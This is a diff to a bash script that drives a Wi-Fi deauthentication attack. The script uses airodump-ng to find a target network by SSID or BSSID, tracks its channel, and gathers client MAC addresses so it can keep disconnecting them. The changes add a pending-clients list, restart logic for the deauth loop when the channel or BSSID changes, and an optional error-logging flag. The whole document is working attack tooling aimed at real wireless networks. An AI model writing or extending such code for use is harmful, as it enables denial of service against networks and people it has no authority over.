@@ -60,6 +60,7 @@ TOT_DEAUTH_COUNT_FILE=""
 CH_DEAUTH_COUNT_FILE=""
 STATUS_FILE=""
 CLIENTS_FILE=""
+CLIENTS_PENDING_FILE=""
 
 SCAN_TIMEOUT="${SCAN_TIMEOUT:-20}"          # seconds (full scan)
 QUICK_CONFIRM="${QUICK_CONFIRM:-5}"         # seconds (if we have a channel hint)
@@ -95,10 +96,12 @@ SCANS_OK=0
 SCANS_IGNORED=0
 SCANS_FAIL=0
 START_TS="$(date +%s)"
+ENABLE_ERROR_LOG=0
 
 # ----------------------------- Helpers ----------------------------
 log_err() {
   local msg="$1"
+  [[ "$ENABLE_ERROR_LOG" -eq 1 ]] || return 0
   printf '[EXIT] %s\n' "$msg" >&2
 }
 
@@ -134,6 +137,7 @@ Options:
              ${DEFAULT_IFACES[*]}
   -stopfile  A file path or wildcard (e.g., /path/start*end.txt). If any match
              exists (checked every 5s), the program exits cleanly.
+  -e         Enable error logging to stderr on exit/traps
   -h         Show this help
 EOF
 }
@@ -356,22 +360,33 @@ parse_csv_for_clients() {
   ' "$csv"
 }
 
-update_clients_from_csv() {
-  # args: csv_file, bssid
-  local csv="$1" bssid="$2"
-  [[ -z "$CLIENTS_FILE" ]] && return 0
-  if [[ -z "$bssid" || ! -f "$csv" ]]; then
-    : > "$CLIENTS_FILE"
-    return 0
-  fi
-  local tmp="${CLIENTS_FILE}.tmp"
-  parse_csv_for_clients "$csv" "$bssid" | sort -u > "$tmp"
-  mv -f "$tmp" "$CLIENTS_FILE"
+merge_clients_from_csv() {
+  # args: csv_file, bssid, target_file
+  local csv="$1" bssid="$2" target="$3"
+  [[ -z "$target" ]] && return 0
+  [[ -z "$bssid" || ! -f "$csv" ]] && return 0
+  local tmp="${target}.tmp"
+  { cat "$target" 2>/dev/null || true; parse_csv_for_clients "$csv" "$bssid"; } | sort -u > "$tmp"
+  mv -f "$tmp" "$target"
 }
 
 clear_clients_file() {
   [[ -z "$CLIENTS_FILE" ]] && return 0
   : > "$CLIENTS_FILE"
+}
+
+clear_pending_clients() {
+  [[ -z "$CLIENTS_PENDING_FILE" ]] && return 0
+  : > "$CLIENTS_PENDING_FILE"
+}
+
+activate_pending_clients() {
+  [[ -z "$CLIENTS_FILE" || -z "$CLIENTS_PENDING_FILE" ]] && return 0
+  if [[ -f "$CLIENTS_PENDING_FILE" ]]; then
+    cp -f "$CLIENTS_PENDING_FILE" "$CLIENTS_FILE"
+  else
+    : > "$CLIENTS_FILE"
+  fi
 }
 
 # --------------------- Scanner (airodump-ng) ---------------------
@@ -537,6 +552,7 @@ start_client_deauth_loop() {
 stop_deauth() {
   stop_client_deauth_loop
   clear_clients_file
+  clear_pending_clients
   if [[ -n "$DEAUTH_MON_PGID" || -n "$DEAUTH_MON_PID" ]]; then
     kill_group_strong "$DEAUTH_MON_PGID" "$DEAUTH_MON_PID" "tail -F ${DEAUTH_LOG}"
     DEAUTH_MON_PGID=""; DEAUTH_MON_PID=""
@@ -551,6 +567,7 @@ stop_deauth() {
 start_deauth() {
   # args: iface, bssid, ch
   local ifc="$1" bssid="$2" ch="$3"
+  activate_pending_clients
   : > "$DEAUTH_LOG"
   : > "$CH_DEAUTH_COUNT_FILE"
   [[ -f "$TOT_DEAUTH_COUNT_FILE" ]] || echo 0 > "$TOT_DEAUTH_COUNT_FILE"
@@ -614,6 +631,7 @@ while [[ $# -gt 0 ]]; do
     -ssid)     TARGET_SSID="${2:-}";  shift 2 ;;
     -i)        INTERFACE="${2:-}";    shift 2 ;;
     -stopfile) STOP_PATTERN="${2:-}"; shift 2 ;;
+    -e)        ENABLE_ERROR_LOG=1;    shift 1 ;;
     -h|--help) usage; exit 0 ;;
     *) echo "Unknown arg: $1" >&2; usage; exit 1 ;;
   esac
@@ -651,9 +669,11 @@ TOT_DEAUTH_COUNT_FILE="${INSTANCE_DIR}/deauth.total"
 CH_DEAUTH_COUNT_FILE="${INSTANCE_DIR}/deauth.ch"
 STATUS_FILE="${INSTANCE_DIR}/status.env"
 CLIENTS_FILE="${INSTANCE_DIR}/clients.list"
+CLIENTS_PENDING_FILE="${INSTANCE_DIR}/clients.pending"
 echo 0 > "$TOT_DEAUTH_COUNT_FILE"
 echo 0 > "$CH_DEAUTH_COUNT_FILE"
 : > "$CLIENTS_FILE"
+: > "$CLIENTS_PENDING_FILE"
 write_status
 
 echo "[INIT] Instance dir: $INSTANCE_DIR"
@@ -714,22 +734,26 @@ while true; do
 
     KNOWN_CH="$NEW_CH"; KNOWN_BSSID="$NEW_BSSID"
 
+    restart_deauth=0
     if [[ -z "$DEAUTH_PGID" ]]; then
-      start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
+      restart_deauth=1
     else
       if [[ "$CURRENT_CH" != "$KNOWN_CH" ]]; then
         echo "[*] Channel changed: ${CURRENT_CH} -> ${KNOWN_CH}. Restarting deauth..."
         stop_deauth
-        start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
+        restart_deauth=1
       elif [[ "$CURRENT_BSSID" != "$KNOWN_BSSID" ]]; then
         echo "[*] Target BSSID changed: ${CURRENT_BSSID} -> ${KNOWN_BSSID}. Restarting deauth..."
         stop_deauth
-        start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
+        restart_deauth=1
       fi
     fi
     csv_file="$(latest_csv || true)"
-    if [[ -n "$csv_file" && -n "$KNOWN_BSSID" ]]; then
-      update_clients_from_csv "$csv_file" "$KNOWN_BSSID"
+    if (( restart_deauth == 1 )); then
+      if [[ -n "$csv_file" && -n "$KNOWN_BSSID" ]]; then
+        merge_clients_from_csv "$csv_file" "$KNOWN_BSSID" "$CLIENTS_PENDING_FILE"
+      fi
+      start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
     fi
     write_status
 
